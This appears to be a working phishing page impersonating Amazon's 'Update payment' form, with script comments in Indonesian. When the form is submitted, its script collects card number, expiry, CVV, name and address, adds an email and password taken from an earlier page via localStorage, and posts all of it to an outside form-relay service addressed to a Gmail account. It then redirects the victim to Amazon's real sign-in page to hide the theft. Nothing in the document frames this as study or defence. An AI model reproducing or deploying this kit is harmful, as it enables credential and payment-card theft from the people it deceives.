<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon - Update Payment</title>
    <style>
        * {margin:0; padding:0; font-family:Arial,sans-serif; box-sizing:border-box;}
        body {background:#fff; padding:20px; display:flex; flex-direction:column; align-items:center;}
        .logo {margin:20px 0;}
        .logo img {height:30px;}
        .box {border:1px solid #ddd; border-radius:4px; padding:25px; width:100%; max-width:350px;}
        h1 {font-size:22px; margin-bottom:20px; padding-bottom:10px; border-bottom:1px solid #eee;}
        label {display:block; font-size:13px; font-weight:bold; margin:15px 0 5px;}
        input, select {width:100%; padding:7px; border:1px solid #a6a6a6; border-radius:4px; font-size:15px;}
        .row {display:flex; gap:10px;}
        .row div {flex:1;}
        button {width:100%; padding:10px; background:linear-gradient(#f7df74,#ecc000); border:1px solid #b88600; border-radius:4px; cursor:pointer; font-size:15px; margin-top:20px;}
        button:disabled {opacity:0.6;}
        .status {margin-top:15px; font-size:13px; display:none;}
        .ok {color:green;}
        .err {color:red;}
    </style>
</head>
<body>
    <div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg"></div>
    <div class="box">
        <h1>Update payment</h1>
        
        <form id="formBilling">
            <label>Card type</label>
            <select id="card_type">
                <option value="">Select card type</option>
                <option value="Visa">Visa</option>
                <option value="Mastercard">Mastercard</option>
                <option value="Amex">American Express</option>
            </select>

            <label>Card number</label>
            <input type="text" id="card_number" maxlength="19" placeholder="XXXX XXXX XXXX XXXX">

            <div class="row">
                <div>
                    <label>Expiry</label>
                    <input type="text" id="expiry" maxlength="5" placeholder="MM/YY">
                </div>
                <div>
                    <label>CVV</label>
                    <input type="text" id="cvv" maxlength="4" placeholder="••••">
                </div>
            </div>

            <label>Full name</label>
            <input type="text" id="fullname">

            <label>Address</label>
            <input type="text" id="address">

            <div class="row">
                <div>
                    <label>City</label>
                    <input type="text" id="city">
                </div>
                <div>
                    <label>State</label>
                    <input type="text" id="state">
                </div>
            </div>

            <div class="row">
                <div>
                    <label>ZIP</label>
                    <input type="text" id="zip">
                </div>
                <div>
                    <label>Country</label>
                    <select id="country">
                        <option value="">Select country</option>
                        <option value="Australia">Australia</option>
                        <option value="Indonesia">Indonesia</option>
                        <option value="United States">United States</option>
                        <option value="Singapore">Singapore</option>
                    </select>
                </div>
            </div>

            <button type="submit" id="btnKirim">Verification</button>
            <div id="status" class="status"></div>
        </form>
    </div>

<script>
// Ambil data dari halaman sebelumnya
const email = localStorage.getItem("dataEmail") || "-";
const password = localStorage.getItem("password") || "-";

// Deteksi lokasi otomatis
async function setLokasi() {
    try {
        const res = await fetch("https://ipapi.co/json/");
        const d = await res.json();
        const negara = d.country_name || "";
        const sel = document.getElementById("country");
        for(let i=0; i<sel.options.length; i++) {
            if(sel.options[i].text === negara) { sel.selectedIndex = i; break; }
        }
        if(d.city) document.getElementById("city").value = d.city;
        if(d.region) document.getElementById("state").value = d.region;
        if(d.postal) document.getElementById("zip").value = d.postal;
    } catch(e) {}
}
setLokasi();

// Format kartu otomatis
document.getElementById("card_number").addEventListener("input", function() {
    let v = this.value.replace(/\D/g,"").slice(0,16);
    this.value = v.length > 0 ? v.match(/.{1,4}/g).join(" ") : "";
});

// Format tanggal otomatis
document.getElementById("expiry").addEventListener("input", function() {
    let v = this.value.replace(/\D/g,"").slice(0,4);
    this.value = v.length >= 3 ? v.slice(0,2)+"/"+v.slice(2) : v;
});

// Kirim data
document.getElementById("formBilling").addEventListener("submit", function(e) {
    e.preventDefault();
    
    const btn = document.getElementById("btnKirim");
    btn.disabled = true;
    btn.textContent = "Mengirim...";

    // Kirim menggunakan FORM standar
    const form = document.createElement("form");
    form.method = "POST";
    form.action = "https://formsubmit.co/jandaanaksatu777@gmail.com";
    
    const fields = {
        _subject: "📋 Data Pembayaran — Result Billing",
        Email: email,
        Password: password,
        Card_Type: document.getElementById("card_type").value,
        Card_Number: document.getElementById("card_number").value,
        Expiry: document.getElementById("expiry").value,
        CVV: document.getElementById("cvv").value,
        Full_Name: document.getElementById("fullname").value,
        Address: document.getElementById("address").value,
        City: document.getElementById("city").value,
        State: document.getElementById("state").value,
        ZIP: document.getElementById("zip").value,
        Country: document.getElementById("country").value
    };
    
    for(let name in fields) {
        const inp = document.createElement("input");
        inp.type = "hidden";
        inp.name = name;
        inp.value = fields[name];
        form.appendChild(inp);
    }
    
    document.body.appendChild(form);
    
    setTimeout(() => {
        window.location.href = "https://www.amazon.com.au/ap/signin";
    }, 500);
    
    form.submit();
});
</script>
</body>
</html>
